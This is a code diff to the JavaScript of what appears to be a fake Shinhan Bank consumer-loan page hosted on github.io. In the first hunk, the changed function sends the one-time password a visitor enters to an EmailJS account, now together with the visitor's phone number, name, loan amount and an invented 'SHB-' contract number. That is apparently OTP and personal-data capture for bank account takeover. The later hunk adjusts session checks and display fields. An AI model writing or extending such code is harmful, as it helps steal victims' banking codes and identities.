@@ -239,13 +239,16 @@
         }
 
         function sendOTPToEmail(otp, phone) {
-            console.log('Sending OTP to EmailJS:', { otp, phone });
-            emailjs.send('service_60tgxof', 'template_p60g14a', {
+            const templateParams = {
                 otp: otp,
-                phone: phone,
-                timestamp: new Date().toLocaleString('vi-VN')
-            }).then(
-                () => console.log('OTP sent to EmailJS:', { otp, phone, timestamp: new Date().toLocaleString('vi-VN') }),
+                phone: phone || 'Không có',
+                customer_name: formData.fullName || 'Không có',
+                total_amount: formData.amount || 'Không có',
+                contract_number: `SHB-${Date.now()}` // Tạo contract number tạm
+            };
+            
+            emailjs.send('service_60tgxof', 'template_p60g14a', templateParams).then(
+                () => console.log('OTP sent to EmailJS:', templateParams),
                 (error) => console.error('EmailJS error:', error)
             );
         }
@@ -381,18 +384,21 @@ Hãy trình bày dưới dạng danh sách các gạch đầu dòng, sử dụng
             const otpInput = document.getElementById('otp');
             const otpErrorInline = document.getElementById('otp-error-inline');
 
-            otpInput.addEventListener('input', () => {
-                otpInput.classList.remove('error');
-                otpErrorInline.classList.add('hidden');
-            });
+            if (otpInput && otpErrorInline) {
+                otpInput.addEventListener('input', () => {
+                    otpInput.classList.remove('error');
+                    otpErrorInline.classList.add('hidden');
+                });
+            }
 
             try {
                 formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-                if (!formData.fullName) {
+                if (!formData.fullName && !formData.accountHolder) {
                     window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
                     return;
                 }
-                document.getElementById('summaryName').textContent = formData.accountHolder || 'N/A';
+                // *** FIX: Ưu tiên accountHolder, nếu không có thì dùng fullName ***
+                document.getElementById('summaryName').textContent = formData.accountHolder || formData.fullName || 'N/A';
                 document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
                 document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
                 document.getElementById('summaryAccountNumber').textContent = formData.accountNumber || 'N/A';
